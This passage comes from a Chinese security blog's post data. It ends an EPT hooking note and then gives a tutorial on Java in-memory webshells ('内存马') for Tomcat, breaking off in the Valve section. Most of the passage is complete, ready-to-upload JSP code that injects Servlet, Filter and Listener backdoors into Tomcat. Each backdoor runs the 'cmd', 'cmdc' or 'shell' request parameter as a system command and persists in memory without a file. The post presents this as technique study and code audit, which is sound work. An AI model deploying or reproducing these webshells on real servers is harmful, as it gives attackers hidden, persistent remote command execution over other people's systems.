Handler中恢复不可执行\n直到遇到要Hook的地方，HOST中直接VMWRITE，修改GUEST_RIP\n\n缺点遇到4kb页面访问次数多的，会巨卡无比。\nMTF置位全程可执行的无痕Hook\n设置EPT页级Hook，使整读和写页无效，而只留下可执行属性\n分配一个新的物理内存（P2），EPT中的EPT Pml1Entry的PhyFrameNumber（原来的P1）替换成新分配的\n修改P2，使其变成一个绝对跳转，跳转到Hook的地方去执行\n页面受到读写访问，EPT Violation，此时将此页面可读&#x2F;写，并设置MTF位\nMTF VM Exit，判断是否是EPT Hook导致的，是则设置不可读写，并替换回P2物理内存。\n\n缺点缺点不太明显，适合Hook内核函数，而对于高频CRC校验的函数，不太适合，总的来说是最适合的EPT无痕Hook了。\n","categories":["Windows安全"],"tags":["Windows","win32api","vt","pg","hook"]},{"title":"JavaMemShell","url":"/2022/03/26/JavaMemShell/","content":"import { GithubCard } from ‘astro-pure&#x2F;advanced’;\n\n\n\nTips：如果你觉得没看懂或者很模糊，那你一定是前置知识没学好\n\n概述内存马又名无文件马，见名知意，指的是无文件落地的webshell，由于传统的webshell需要写入文件，难以逃避防篡改监控。为了与传统的防御手段对抗，衍生出了一种新型的内存WebShell技术，核心思想用一句话概括，即：利用类加载或Agent机制在JavaEE、框架或中间件的API中动态注册一个可访问的后门。\n前置知识\nJava web三大件\nTomcat\nJava 反射\nSpring MVC\nJava Agent\nWebSocket\nNative\n汇编\nJNI\nIDA\n\nFilter和Servlet的回顾性总结对于基于Filter和Servlet实现的简单架构项目，代码审计的重心集中于找出所有的Filter分析其过滤规则，找出是否有做全局的安全过滤、敏感的URL地址是否有做权限校验并尝试绕过Filter过滤。第二点则是找出所有的Servlet，分析Servlet的业务是否存在安全问题,如果存在安全问题是否可以利用？是否有权限访问？利用时是否被Filter过滤等问题，切勿看到Servlet、JSP中的漏洞点就妄下定论，不要忘了Servlet前面很有可能存在一个全局安全过滤的Filter。\nFilter和Servlet都是Java Web提供的API，简单的总结了下有如下共同点。\n\nFilter和Servlet都需要在web.xml或注解(@WebFilter、@WebServlet)中配置，而且配置方式是非常的相似的。\n\nFilter和Servlet都可以处理来自Http请求的请求，两者都有request、response对象。\n\nFilter和Servlet基础概念不一样，Servlet定义是容器端小程序，用于直接处理后端业务逻辑，而Filter的思想则是实现对Java Web请求资源的拦截过滤。\n\nFilter和Servlet虽然概念上不太一样，但都可以处理Http请求，都可以用来实现MVC控制器(Struts2和Spring框架分别基于Filter和Servlet技术实现的)。\n\n一般来说Filter通常配置在MVC、Servlet和JSP请求前面，常用于后端权限控制、统一的Http请求参数过滤(统一的XSS、SQL注入、Struts2命令执行等攻击检测处理)处理，其核心主要体现在请求过滤上，而Servlet更多的是用来处理后端业务请求上。\n\n\n内存马的发展历史17年n1nty师傅的Tomcat 源代码调试笔记 - 看不见的 Shell\n18年经过rebeyong师傅使用agent技术加持后，利用进程注入”实现无文件不死webshell\n20年，LandGrey师傅构造了Spring controller内存马——基于内存 Webshell 的无文件攻击技术研究\n内存马的类型\nAgent型\n利用 instrument 机制，在不增加新类和新方法的情况下，对现有类的执行逻辑进行修改。JVM层注入，通用性强。\n利用 Javassist 库，在不增加新类和新方法的情况下，对现有类的执行逻辑进行修改。JVM层注入，通用性强。\n\n\n非Agent型\n通过新增一些Java web组件（如 Servlet、Filter、Listener、Controller、WebSocket、Tomcat 等）来实现拦截请求，从而注入木马代码，对目标容器环境有较强的依赖性，通用性较弱。\n\n\n\nServlet-API 提供的动态注册机制早在 2013 年，国际大站 p2j 就发布了这种特性的一种使用方法：\n\nServlet、Listener、Filter 由 javax.servlet.ServletContext 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。\nServlet 3.0 API 允许使 ServletContext 用动态进行注册，在 Web 容器初始化的时候（即建立ServletContext 对象的时候）进行动态注册。可以看到 ServletContext 提供了 addcreate 方法来实现动态注册的功能。\n\nServlet型Servlet 是 Server Applet（服务器端小程序）的缩写，用来读取客户端发送的数据，处理并返回结果。也是最常见的 Java 技术之一。\n\n\n那么在一次访问到达 Tomcat 时，是如何匹配到具体的 Servlet 的？这个过程简单一点，只有两部走：\n\nApplicationServletRegistration 的 addMapping 方法调用 StandardContext#addServletMapping 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）\n\n同时在 servletMappings 中添加 URL 路径与 name 的映射。\n\n实现过程：\n\n\n\n创建一个恶意的servlet\n获取当前的StandardContext\n将恶意servlet封装成wrapper添加到StandardContext的children当中\n添加ServletMapping将访问的URL和wrapper进行绑定\n\n执行下面的代码，访问当前应用的&#x2F;shell路径，加上cmd参数就可以命令执行\nlog title&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%    // 创建恶意Servlet    Servlet servlet = new Servlet() &#123;        @Override        public void init(ServletConfig servletConfig) throws ServletException &#123;        &#125;        @Override        public ServletConfig getServletConfig() &#123;            return null;        &#125;        @Override        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;            String cmd = servletRequest.getParameter(&quot;cmd&quot;);            boolean isLinux = true;            String osTyp = System.getProperty(&quot;os.name&quot;);            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;                isLinux = false;            &#125;            String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();            Scanner s = new Scanner(in).useDelimiter(&quot;\\\\a&quot;);            String output = s.hasNext() ? s.next() : &quot;&quot;;            PrintWriter out = servletResponse.getWriter();            out.println(output);            out.flush();            out.close();        &#125;        @Override        public String getServletInfo() &#123;            return null;        &#125;        @Override        public void destroy() &#123;        &#125;    &#125;;    %&gt;&lt;%    // 获取StandardContext    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();    // 用Wrapper对其进行封装    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();    newWrapper.setName(&quot;jweny&quot;);    newWrapper.setLoadOnStartup(1);    newWrapper.setServlet(servlet);    newWrapper.setServletClass(servlet.getClass().getName());    // 添加封装后的恶意Wrapper到StandardContext的children当中    standardCtx.addChild(newWrapper);    // 添加ServletMapping将访问的URL和Servlet进行绑定    standardCtx.addServletMapping(&quot;/shell&quot;,&quot;jweny&quot;);%&gt;\n\n另一种实现方式：\nlog title&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import = &quot;org.apache.catalina.core.ApplicationContext&quot;%&gt;&lt;%@ page import = &quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import = &quot;javax.servlet.*&quot;%&gt;&lt;%@ page import = &quot;javax.servlet.annotation.WebServlet&quot;%&gt;&lt;%@ page import = &quot;javax.servlet.http.HttpServlet&quot;%&gt;&lt;%@ page import = &quot;javax.servlet.http.HttpServletRequest&quot;%&gt;&lt;%@ page import = &quot;javax.servlet.http.HttpServletResponse&quot;%&gt;&lt;%@ page import = &quot;java.io.IOException&quot;%&gt;&lt;%@ page import = &quot;java.lang.reflect.Field&quot;%&gt;&lt;!-- 1 request this file --&gt;&lt;!-- 2 request thisfile/../evilpage?cmd=calc --&gt;&lt;%class EvilServlet implements Servlet&#123;    @Override    public void init(ServletConfig config) throws ServletException &#123;&#125;    @Override    public String getServletInfo() &#123;return null;&#125;    @Override    public void destroy() &#123;&#125;    public ServletConfig getServletConfig() &#123;return null;&#125;        @Override    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;        HttpServletRequest request1 = (HttpServletRequest) req;        HttpServletResponse response1 = (HttpServletResponse) res;        if (request1.getParameter(&quot;cmd&quot;) != null)&#123;            Runtime.getRuntime().exec(request1.getParameter(&quot;cmd&quot;));        &#125;        else&#123;            response1.sendError(HttpServletResponse.SC_NOT_FOUND);        &#125;    &#125;&#125;%&gt;&lt;%ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); EvilServlet evilServlet = new EvilServlet();org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();evilWrapper.setName(&quot;evilPage&quot;);evilWrapper.setLoadOnStartup(1);evilWrapper.setServlet(evilServlet);evilWrapper.setServletClass(evilServlet.getClass().getName());standardContext.addChild(evilWrapper);standardContext.addServletMapping(&quot;/evilpage&quot;, &quot;evilPage&quot;);out.println(&quot;动态注入servlet成功&quot;);%&gt;%&gt;&lt;%String name = &quot;DefaultFilter&quot;;ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;); appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);Configs.setAccessible(true);Map filterConfigs = (Map) Configs.get(standardContext);if (filterConfigs.get(name) == null)&#123;    DefaultFilter filter = new DefaultFilter();    FilterDef filterDef = new FilterDef();    filterDef.setFilterName(name);    filterDef.setFilterClass(filter.getClass().getName());    filterDef.setFilter(filter);    standardContext.addFilterDef(filterDef);    FilterMap filterMap = new FilterMap();    // filterMap.addURLPattern(&quot;/*&quot;);    filterMap.addURLPattern(&quot;/abcd&quot;);    filterMap.setFilterName(name);    filterMap.setDispatcher(DispatcherType.REQUEST.name());    standardContext.addFilterMapBefore(filterMap);    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);    constructor.setAccessible(true);    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);    filterConfigs.put(name, filterConfig);    out.write(&quot;Inject success!&quot;);&#125;else&#123;    out.write(&quot;Injected&quot;);&#125;%&gt;\n\nFilter型Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。\n通常情况下，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：\n\n使用 ServletContext 的 addFilter&#x2F;createFilter 方法注册；\n\n使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册（将会在 Listener 中进行描述）；\n\n使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态，后面会描述）。\n\n\n首先来看一下 createFilter 方法，按照注释，这个类用来在调用 addFilter 向 ServletContext 实例化一个指定的 Filter 类。\n\n这个类还约定了一个事情，那就是如果这个 ServletContext 传递给 ServletContextListener 的 ServletContextListener.contextInitialized 方法，该方法既未在 web.xml 或 web-fragment.xml 中声明，也未使用 javax.servlet.annotation.WebListener 进行注释，则会抛出 UnsupportedOperationException 异常，这个约定其实是非常重要的一点。\n接下来看 addFilter 方法，ServletContext 中有三个重载方法，分别接收字符串类型的 filterName以及 Filter 对象&#x2F;className 字符串&#x2F;Filter 子类的 Class 对象，提供不同场景下添加 filter 的功能，这些方法均返回 FilterRegistration.Dynamic 实际上就是 FilterRegistration 对象。\naddFilter 方法实际上就是动态添加 filter 的最核心和关键的方法，但是这个类中同样约定了 UnsupportedOperationException 异常。\n由于 Servlet API 只是提供接口定义，具体的实现还要看具体的容器，那我们首先以 Tomcat 7.0.96 为例，看一下具体的实现细节。相关实现方法在 org.apache.catalina.core.ApplicationContext#addFilter 中。\n\n可以看到，这个方法创建了一个 FilterDef 对象，将 filterName、filterClass、filter 对象初始化进去，使用 StandardContext 的 addFilterDef 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中，然后 new 了一个 ApplicationFilterRegistration 对象并且返回，并没有将这个 Filter 放到 FilterChain 中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。\n这时我们肯定要想，能不能直接操纵 FilterChain 呢？FilterChain 在 Tomcat 中的实现是 org.apache.catalina.core.ApplicationFilterChain，这个类提供了一个 addFilter 方法添加 Filter，这个方法接受一个 ApplicationFilterConfig 对象，将其放在 this.filters 中。答案是可以，但是没用，因为对于每次请求需要执行的 FilterChain 都是动态取得的。\n那Tomcat 是如何处理一次请求对应的 FilterChain 的呢？在 ApplicationFilterFactory 的 createFilterChain 方法中，可以看到流程如下：\n\n在 context 中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配；\n如果匹配则在 context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig；\n如果获取到 filterConfig，则将其加入到 filterChain 中\n后续将会循环 filterChain 中的全部 filterConfig，通过 getFilter 方法获取 Filter 并执行 Filter 的 doFilter 方法。\n通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。\n\n在之前的 ApplicationContext 的 addFilter 中将 filter 初始化存在了 StandardContext 的 filterDefs 中，那后面又是如何添加在其他参数中的呢？\n在 StandardContext 的 filterStart 方法中生成了 filterConfigs：\n\n在 ApplicationFilterRegistration 的 addMappingForUrlPatterns 中生成了 filterMaps：\n\n而这两者的信息都是从 filterDefs 中的对象获取的。\n在了解了上述逻辑后，在应用程序中动态的添加一个 filter 的思路就清晰了：\n\n调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；\n调用 StandardContext 的 filterStart 方法生成 filterConfigs；\n调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；\n为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位。\n\n基于以上思路的实现在 threedr3am 师傅的这篇文章中有实现代码，我这里不再重复，而且这种实现方式也不适合我，既然知道了需要修改的关键位置，那就没有必要调用方法去改，直接用反射加进去就好了，其中中间还有很多小细节可以变化，但都不是重点，略过。\n具体实现代码如下：\n\n可以看到请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行\n自定义一个filter\npackage com.zzddhmt7;import javax.servlet.*;import java.io.IOException;public class filterDemo implements Filter &#123;    @Override    public void init(FilterConfig filterConfig) throws ServletException &#123;        System.out.println(&quot;Filter初始化创建....&quot;);    &#125;    @Override    public void doFilter(ServletRequest request, ServletResponse response,                         FilterChain chain) throws IOException, ServletException &#123;        System.out.println(&quot;进行过滤操作......&quot;);        // 放行        chain.doFilter(request, response);    &#125;    @Override    public void destroy() &#123;    &#125;&#125;\n\n然后在web.xml中注册filter，这里我设置url-pattern为 &#x2F;demo 即访问 &#x2F;demo 才会触发\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;         version=&quot;4.0&quot;&gt;    &lt;filter&gt;        &lt;filter-name&gt;filterDemo&lt;/filter-name&gt;        &lt;filter-class&gt;filter.filterDemo&lt;/filter-class&gt;    &lt;/filter&gt;    &lt;filter-mapping&gt;        &lt;filter-name&gt;filterDemo&lt;/filter-name&gt;        &lt;url-pattern&gt;/demo&lt;/url-pattern&gt;    &lt;/filter-mapping&gt;&lt;/web-app&gt;\n\n访问http://localhost:8080/demo ，就可以发现成功触发\n过程：\n\n创建恶意 filter ;\n用 filterDef 对 filter 进行封装 ;\n将 filterDef 添加到 filterDefs 跟 filterConfigs 中\n创建一个新的 filterMap 将 URL 跟 filter 进行绑定，并添加到 filterMaps 中。要注意的是，因为 filter 生效会有一个先后顺序，所以一般来讲我们还需要把我们的 filter 给移动到 FilterChain 的第一位去;\n每次请求 createFilterChain 都会依据此动态生成一个过滤链，而 StandardContext 又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启;\n\n访问下面这个 jsp ，注入成功后，用 ?cmd&#x3D; 即可命令执行（该方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是 servlet 3 以后引入，而 Tomcat 7 以上才支持 Servlet 3 ）：\njsp&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%    final String name = &quot;KpLi0rn&quot;;    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);    Configs.setAccessible(true);    Map filterConfigs = (Map) Configs.get(standardContext);    if (filterConfigs.get(name) == null)&#123;        Filter filter = new Filter() &#123;            @Override            public void init(FilterConfig filterConfig) throws ServletException &#123;            &#125;            @Override            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                HttpServletRequest req = (HttpServletRequest) servletRequest;                if (req.getParameter(&quot;cmd&quot;) != null)&#123;                    byte[] bytes = new byte[1024];                    Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();                    int len = process.getInputStream().read(bytes);                    servletResponse.getWriter().write(new String(bytes,0,len));                    process.destroy();                    return;                &#125;                filterChain.doFilter(servletRequest,servletResponse);            &#125;            @Override            public void destroy() &#123;            &#125;        &#125;;        FilterDef filterDef = new FilterDef();        filterDef.setFilter(filter);        filterDef.setFilterName(name);        filterDef.setFilterClass(filter.getClass().getName());        /**         * 将filterDef添加到filterDefs中         */        standardContext.addFilterDef(filterDef);        FilterMap filterMap = new FilterMap();        filterMap.addURLPattern(&quot;/*&quot;);        filterMap.setFilterName(name);        filterMap.setDispatcher(DispatcherType.REQUEST.name());        standardContext.addFilterMapBefore(filterMap);        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);        constructor.setAccessible(true);        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);        filterConfigs.put(name,filterConfig);        out.print(&quot;Inject Success !&quot;);    &#125;%&gt;\n\n适用更多版本的实现：\njsp&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import = &quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import = &quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import = &quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import = &quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;!-- tomcat 8/9 --&gt;&lt;!-- page import = &quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;page import = &quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; --&gt;&lt;!-- tomcat 7 --&gt;&lt;%@ page import = &quot;org.apache.catalina.deploy.FilterMap&quot; %&gt;&lt;%@ page import = &quot;org.apache.catalina.deploy.FilterDef&quot; %&gt;&lt;%@ page import = &quot;javax.servlet.*&quot; %&gt;&lt;%@ page import = &quot;javax.servlet.annotation.WebServlet&quot; %&gt;&lt;%@ page import = &quot;javax.servlet.http.HttpServlet&quot; %&gt;&lt;%@ page import = &quot;javax.servlet.http.HttpServletRequest&quot; %&gt;&lt;%@ page import = &quot;javax.servlet.http.HttpServletResponse&quot; %&gt;&lt;%@ page import = &quot;java.io.IOException&quot; %&gt;&lt;%@ page import = &quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import = &quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import = &quot;java.lang.reflect.InvocationTargetException&quot; %&gt;&lt;%@ page import = &quot;java.util.Map&quot; %&gt;&lt;!-- 1 revise the import class with correct tomcat version --&gt;&lt;!-- 2 request this jsp file --&gt;&lt;!-- 3 request xxxx/this file/../abcd?cmdc=calc --&gt;&lt;%class DefaultFilter implements Filter &#123;  @Override  public void init(FilterConfig filterConfig) throws ServletException &#123;  &#125;  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;    HttpServletRequest req = (HttpServletRequest) servletRequest;    HttpServletResponse response = (HttpServletResponse) servletResponse;    if (req.getParameter(&quot;cmdc&quot;) != null) &#123;      Runtime.getRuntime().exec(req.getParameter(&quot;cmdc&quot;));      response.getWriter().println(&quot;exec done&quot;);    &#125;    filterChain.doFilter(servletRequest, servletResponse);  &#125;  public void destroy() &#123;&#125;&#125;%&gt;&lt;%String name = &quot;DefaultFilter&quot;;ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;); appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);Configs.setAccessible(true);Map filterConfigs = (Map) Configs.get(standardContext);if (filterConfigs.get(name) == null)&#123;DefaultFilter filter = new DefaultFilter();FilterDef filterDef = new FilterDef();    filterDef.setFilterName(name);    filterDef.setFilterClass(filter.getClass().getName());        filterDef.setFilter(filter);    standardContext.addFilterDef(filterDef);FilterMap filterMap = new FilterMap();// filterMap.addURLPattern(&quot;/*&quot;);    filterMap.addURLPattern(&quot;/abcd&quot;);    filterMap.setFilterName(name);    filterMap.setDispatcher(DispatcherType.REQUEST.name());        standardContext.addFilterMapBefore(filterMap);Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);    constructor.setAccessible(true);ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);    filterConfigs.put(name, filterConfig);    out.write(&quot;Inject success!&quot;);&#125;        else&#123;        out.write(&quot;Injected&quot;);&#125;        %&gt;\n\nListener型Servlet 和 Filter 是程序员常接触的两个技术，所以在网络上对于之前两小节的讨论较多，对于 Listener 的讨论较少。但实际上这个点还是有很多师傅关注到了。\nListener 可以译为监听器，监听器用来监听对象或者流程的创建与销毁，通过 Listener，可以自动触发一些操作，因此依靠它也可以完成内存马的实现。先来了解一下 Listener 是干什么的，看一下 Servlet API 中的注释。\n\n在应用中可能调用的监听器如下：\n\nServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）\nServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）\nServletRequestListener：对 Request 请求进行监听（创建、销毁）\nServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）\njavax.servlet.http.HttpSessionListener：对 Session 整体状态的监听\njavax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听\n\n可以看到 Listener 也是为一次访问的请求或生命周期进行服务的，在上述每个不同的接口中，都提供了不同的方法，用来在监听的对象发生改变时进行触发。而这些类接口，实际上都是 java.util.EventListener 的子接口。这里我们看到，在 ServletRequestListener 接口中，提供了两个方法在 request 请求创建和销毁时进行处理，比较适合我们用来做内存马。\n\n而除了这个 Listener，其他的 Listener 在某些情况下也可以触发作为内存马的实现，本篇文章里不会对每个都进行触发测试，感兴趣的师傅可以自测。\nServletRequestListener 提供两个方法：requestInitialized 和 requestDestroyed，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。\n\nTomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。\n具体实现如下\n过程：\n\n创建恶意Listener\n将其添加到ApplicationEventListener中去\n上传并访问下面这个jsp文件\n\njsp&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%  Object obj = request.getServletContext();  java.lang.reflect.Field field = obj.getClass().getDeclaredField(&quot;context&quot;);  field.setAccessible(true);  ApplicationContext applicationContext = (ApplicationContext) field.get(obj);  //获取ApplicationContext  field = applicationContext.getClass().getDeclaredField(&quot;context&quot;);  field.setAccessible(true);  StandardContext standardContext = (StandardContext) field.get(applicationContext);  //获取StandardContext  ListenerDemo listenerdemo = new ListenerDemo();  //创建能够执行命令的Listener  standardContext.addApplicationEventListener(listenerdemo);%&gt;&lt;%!  public class ListenerDemo implements ServletRequestListener &#123;  public void requestDestroyed(ServletRequestEvent sre) &#123;    System.out.println(&quot;requestDestroyed&quot;);  &#125;  public void requestInitialized(ServletRequestEvent sre) &#123;    System.out.println(&quot;requestInitialized&quot;);    try&#123;      String cmd = sre.getServletRequest().getParameter(&quot;cmd&quot;);      Runtime.getRuntime().exec(cmd);    &#125;catch (Exception e )&#123;      //e.printStackTrace();    &#125;  &#125;&#125;%&gt;\n\n另一种实现\njsp&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.*&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.annotation.WebServlet&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.http.HttpServlet&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.http.HttpServletRequest&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.http.HttpServletResponse&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;!-- 1、exec this--&gt;&lt;!-- 2、request any url with a parameter of &quot;shell&quot; --&gt;&lt;%class S implements ServletRequestListener&#123;    @Override    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;            &#125;    @Override    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;        if(request.getParameter(&quot;shell&quot;) != null)&#123;            try &#123;                Runtime.getRuntime().exec(request.getParameter(&quot;shell&quot;));            &#125; catch (IOException e) &#123;&#125;        &#125;    &#125;&#125;%&gt;&lt;%ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);out.println(&quot;inject success&quot;);S servletRequestListener = new S();standardContext.addApplicationEventListener(servletRequestListener);%&gt;&lt;!-- 1、exec this--&gt;&lt;!-- 2、request any url with a parameter of &quot;shell&quot; --&gt;\n\nValve型在了解 Valve 之前，我们先来简单了解一下 Tomcat 中的管道机制。\n我们知道，当 Tomcat 接收到客户端请求时，首先会使用 Connector 进行解析，然后发送到 Container 进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到 Servlet 进行处理的呢？这里涉及到的机制就是 Tomcat 管道机制。\n管道机制主要涉及到两个名词，Pipeline（管道）和 Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。\n因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。个人理解就是管道与阀门的这种模式，我们可以通过调整阀门，来实现不同的业务。\nPipeline 中会有一个最基础的 Valve，这个 Valve 也被称之为 